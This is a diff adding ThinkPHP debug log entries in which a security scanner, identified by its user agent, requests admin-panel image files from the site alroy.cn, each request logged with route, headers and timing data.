+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:01+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/view/image/flags/wales.png
+[ log ] alroy.cn/admin/view/image/flags/wales.png [运行时间：0.028484s][吞吐率：35.11req/s] [内存消耗：1,840.16kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'view',
+    2 => 'image',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'flags' => 'wales.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:01+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/view/image/checkmark.png
+[ log ] alroy.cn/admin/view/image/checkmark.png [运行时间：0.032082s][吞吐率：31.17req/s] [内存消耗：1,839.66kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'view',
+    2 => 'image',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:01+08:00 ] 60.205.45.195 140.205.201.41 GET /adminsoft/templates/images/bullet_blue.gif
+[ log ] alroy.cn/adminsoft/templates/images/bullet_blue.gif [运行时间：0.025960s][吞吐率：38.52req/s] [内存消耗：1,838.61kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'adminsoft',
+    1 => 'templates',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:02+08:00 ] 60.205.45.195 140.205.201.41 GET /public/plug/shipplug/exp04.jpg
+[ log ] alroy.cn/public/plug/shipplug/exp04.jpg [运行时间：0.027764s][吞吐率：36.02req/s] [内存消耗：1,838.67kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'public',
+    1 => 'plug',
+    2 => 'shipplug',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:02+08:00 ] 60.205.45.195 140.205.201.41 GET /images/admin/logo.gif
+[ log ] alroy.cn/images/admin/logo.gif [运行时间：0.030532s][吞吐率：32.75req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'admin',
+    2 => 'logo.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:02+08:00 ] 60.205.45.195 140.205.201.41 GET /images/admin/sprites.png
+[ log ] alroy.cn/images/admin/sprites.png [运行时间：0.026846s][吞吐率：37.25req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'admin',
+    2 => 'sprites.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:03+08:00 ] 60.205.45.195 140.205.201.41 GET /ACT_inc/ItemBg.gif
+[ log ] alroy.cn/ACT_inc/ItemBg.gif [运行时间：0.025646s][吞吐率：38.99req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ACT_inc',
+    1 => 'ItemBg.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:03+08:00 ] 60.205.45.195 140.205.201.41 GET /ACT_inc/share/minusbottom.gif
+[ log ] alroy.cn/ACT_inc/share/minusbottom.gif [运行时间：0.030986s][吞吐率：32.27req/s] [内存消耗：1,838.70kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ACT_inc',
+    1 => 'share',
+    2 => 'minusbottom.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:03+08:00 ] 60.205.45.195 140.205.201.41 GET /Admin/Images/bg_admin.jpg
+[ log ] alroy.cn/Admin/Images/bg_admin.jpg [运行时间：0.028553s][吞吐率：35.02req/s] [内存消耗：1,839.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Admin',
+    1 => 'Images',
+    2 => 'bg_admin.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:04+08:00 ] 60.205.45.195 140.205.201.41 GET /images/act_1.gif
+[ log ] alroy.cn/images/act_1.gif [运行时间：0.032713s][吞吐率：30.57req/s] [内存消耗：1,838.57kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'act_1.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:51:04+08:00 ] 60.205.45.195 140.205.201.41 GET /images/reg.gif
+[ log ] alroy.cn/images/reg.gif [运行时间：0.027997s][吞吐率：35.72req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'reg.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
